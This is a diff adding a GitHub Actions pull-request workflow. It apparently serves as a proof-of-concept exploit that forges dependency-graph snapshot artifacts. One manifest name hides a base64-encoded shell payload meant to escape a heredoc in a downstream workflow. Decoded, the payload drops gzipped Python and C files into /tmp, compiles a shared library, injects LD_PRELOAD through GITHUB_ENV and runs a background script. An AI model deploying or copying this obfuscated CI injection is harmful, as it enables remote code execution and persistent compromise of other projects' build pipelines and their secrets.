@@ -1,0 +1,47 @@
+name: PR Workflow
+on: pull_request
+permissions:
+  contents: read
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - name: craft forged dependency graph
+        env:
+          BASE_SHA: ${{ github.event.pull_request.base.sha }}
+          HEAD_SHA: ${{ github.event.pull_request.head.sha }}
+          PR_NUM: ${{ github.event.pull_request.number }}
+        run: |
+          mkdir -p dependency-graph-reports
+          python3 - <<'PY'
+          import json, os, base64, time
+          base = os.environ["BASE_SHA"]
+          head = os.environ["HEAD_SHA"]
+          n = os.environ["PR_NUM"]
+          evil = base64.b64decode("cG9jCkVPRgpzZXQgK2UKWyAtZiAvdG1wL2diL29uY2UgXSAmJiBleGl0IDAKdG91Y2ggL3RtcC9nYi9vbmNlCmVjaG8gR0FCX1JDRV8xNzk0NDMxMDEzCmlkCnVuYW1lIC1hCmVjaG8gOjplcnJvciB0aXRsZT1HQUJfUkNFXzE3OTQ0MzEwMTM6OnVpZC0kKGlkIC11KS1ob3N0LSQoaG9zdG5hbWUpCm1rZGlyIC1wIC90bXAvZ2IKZWNobyBINHNJQUFBQUFBQUMvNDFVYlcvYk5oRCs3bDlCSEJDQXFta3E3MWlWYVVEUnVQc3dyQWtjQndQbUdnRWxuUzNHa3NpU1ZKSW02My9mVVhiVGRHMkJmYUhFbDd0NzdubnVUcmZXdU1DTUYvNlRGK3ZHRk9MV20wNFV5dVBwc1FpNlJlRlE5SzVwZENFZGZ1elJCNlk4dXg3TmNyZzhmeGZNbjhwdDB1QzBXdU1FcldvbmQwZEh4VUY1ZWpJcHNIaU5KM0IybmtNYVdwdXVDemd6WHJacWc1VjJucDhMZk5BKzNKaE5QbmM5SnFNS1YweHhLMEwrM25RbzJoeCtuODVCRk1NMnlVYk01ZGR5dGdYQm9RN0IraXhObGRWeXJVUGRGN0kwTFl5dHFGUlFlY0ZVVjdHWWphejYxbnBlSkJLNzBsVElFOUZpcUUyVnQ4bVprNnFxYm1wVUZUb09iOG9TYlFBQnl0cEdseXBvMDZWM1hiVUxNSTd1SUJreHZXSWgrNDlwVHk2ZGZoeHN5RU13Ryt3WWpBTTlEKzVUOWtEWWlVZGpzZU51WU5iMElUODhJUWdZZXRleEIrbURDcjBYRDBTMHFuZ2lLOXpDSFRGOGlMallkUGlRL3lnQlpqdkRmWkxJT3I0akVIa1FQcEsxeVIxSzN4ZmN3WWUvQ0JDSWtDd21CNGZaY3NCUFNsZ1ZhamxvUUdLTUlhMWd2RWwyWGtkc1FQcmxXTUE5SkxKc2pCL3crRUNxS0E0cFJUWStoZkdNM2hGSHRGK2xrUkdmVm5pSGxHMkxYWWlSS1dhK2dQbkZIOVAzT1pFaTRHcjJsbjY4Z091cjZTeitCY2VqeDk2aml3YUpnTm4wOHVMRnpYT3M3ZTNWOU8xc09yLzYwUU1DbzhySWswODlscFNRSHp3dXQwclUrVkFWalNHWVZCVUxNTVV0bGdHV0MvQzFndVgzZEdmUFhOaG5MdTZkRHNqaFF3ZnkxdWlPNitTTGtpTld1QnhjaVpPOWFyTG5ZWS9yTHZDb3VJd0xKL0NieUlla0lzT3U0cFRudTU5a3NhTTB3aGR3ZVhGRjNmQUVkQUJaWFAyT2FoZ1hUZ3pZcy9wemtuemorL0o2L2hQZnBla0NpZVBUQWFtWFEyM3ZiWVpJMTBPZ0ZyMm50bzdCU21UYktEc3J5TFlqUWhhbng3dXVla25GYzZkOUxXSUJoVk5kV1pPbDI0TDhmNlNPNXJHT3FiT3RicEJxZVYzN204V2J5ZDlxOHJnL2ViMThPdG9Ybi85WjEvWUhoMFBQM2xDVnY3aTdXVDRkMGlVMU1mVkFRd0JvOEVubDFuZkpid2NaUHU4V0Iwc2FBdlJERDdIeFNQMzBtTCtRY0h4OHVEOWk5elZoWWkrT2YzMmtoMnhsSExOTWR5d09WQmtYb3Q0NlU2YUxpTzVWaXQyZGRuR1NqTCsraUVUUXVYd0ZzWG5aVUtsVlBuQmtCYmlDMlBsMkxFQWZWcjlRWDVPbWpTb3hqaVgyZmVWR3ZYVFhZN3lNdU5xSWF5NVh1cXVJYXNlcmhMSnU1ZHFaM3ZLRFJOam9ac2pJTjRpV3k2Tms5Qyt2YWtFdUpnWUFBQT09IHwgYmFzZTY0IC1kIHwgZ3VuemlwIC1jID4gL3RtcC9nYi90LnB5CmVjaG8gSDRzSUFBQUFBQUFDLzIyUVgydkNNQlRGMy8wVVhVUk1hdkFQRTEreTdtVTRHQnNiYkw2NVVXcWF0QUZOUW5OYkp1cDMzN1VvNkJBQzRmN096YmszcDJ1c1hOZTVpaDRDNU1ZTnk4ZE85eEt0emVxYTFkWWcvdDlYR1ZzY1dacG1nTVdxQnBXbWxFcG5VYXNsdUlxeEFCa1lHVFhPNUZGQmp4ZmJ5VEtySXIrY1RYOUVzQjVkUUZQUFoxTk9SckR4bzJJMVVyWVo5bkxDQ3dYZTVKUXhvWDVCVlRZNlBvMWpsRTNsckRoVjR2bmxiUjdyUkR1dkxEcVJqREJoTk5Wc3AxMUZWWEx1eDFZMUdEQ1VjRUU4TkZhY0xENWU1KzhKWWZ2OUJmeWFQMzNPRjBpWlBpMm9PZW1GYjB0NHJKalFjdTJDd2dIaWNITkMrOFc0U2RCT2xxMWpQK20zTzkwMURQTUJZMnNsbXNHZ1JkaGw1Y2JUaHBPaURDbmhVMXptbXZwYjFFQlpyMUtmQVlxVENUc0ZLNWV6OGZnaVdjbXg1c1J2b1hUMlBqcEhERU8valhxQjhJYUpzQTJnTmxUaWR3Nkh6aDh0VWZ6VkhnSUFBQT09IHwgYmFzZTY0IC1kIHwgZ3VuemlwIC1jID4gL3RtcC9nYi9wLmMKZ2NjIC1zaGFyZWQgLWZQSUMgLW8gL3RtcC9nYi9wLnNvIC90bXAvZ2IvcC5jCmVjaG8gTERfUFJFTE9BRD0vdG1wL2diL3Auc28gPj4gJEdJVEhVQl9FTlYKc2V0c2lkIG5vaHVwIHB5dGhvbjMgL3RtcC9nYi90LnB5ID4gL3RtcC9nYi9sb2cgMj4mMSAmCmV4aXQgMAoj").decode()
+          ts = str(int(time.time()))
+          def man(loc, purls):
+              return {"name": loc, "file": {"source_location": loc},
+                      "resolved": {p: {"package_url": p, "relationship": "direct",
+                                      "scope": "runtime", "dependencies": []} for p in purls}}
+          def snap(sha, ref, mans, corr):
+              return {"version": 0, "sha": sha, "ref": ref,
+                      "job": {"correlator": corr, "id": corr},
+                      "detector": {"name": corr, "version": "1.0.0", "url": "https://example.com"},
+                      "scanned": "2026-10-30T00:00:00Z", "manifests": mans}
+          bm = {"build.gradle": man("build.gradle", ["pkg:maven/com.example/base@1.0.0"])}
+          hm = {"build.gradle": man("build.gradle", ["pkg:maven/com.example/base@1.0.0"]),
+                evil: man(evil, ["pkg:maven/com.example/zzz@1.0.0"])}
+          json.dump(snap(base, "refs/heads/poc-base", bm, "gab" + ts + "b"),
+                    open("dependency-graph-reports/base.json", "w"))
+          json.dump(snap(head, "refs/pull/%s/merge" % n, hm, "gab" + ts + "h"),
+                    open("dependency-graph-reports/head.json", "w"))
+          print("evil_len", len(evil))
+          PY
+          echo keep > keep.txt
+      - uses: actions/upload-artifact@v4
+        with:
+          name: dependency-graph_poc.json
+          path: |
+            dependency-graph-reports/
+            keep.txt
